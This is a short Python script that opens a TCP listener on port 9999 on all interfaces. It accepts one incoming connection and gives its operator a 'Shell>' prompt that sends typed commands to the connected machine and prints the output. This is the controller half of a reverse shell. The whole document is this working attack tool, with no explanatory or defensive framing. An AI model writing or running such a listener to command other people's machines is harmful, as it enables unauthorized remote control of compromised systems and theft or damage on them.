import socket

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Listen on all interfaces on port 9999
    server.listen(5)
    print("[*] Listening on 0.0.0.0:9999")

    client_socket, addr = server.accept()  # Accept a connection
    print(f"[*] Connection from {addr} has been established!")

    while True:
        command = input("Shell> ")  # Get command from user
        if command.lower() == 'exit':
            client_socket.send(b'exit')  # Send exit command
            break
        if command:
            client_socket.send(command.encode())  # Send command to client
            response = client_socket.recv(4096).decode()  # Receive response
            print(response)  # Print the response

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
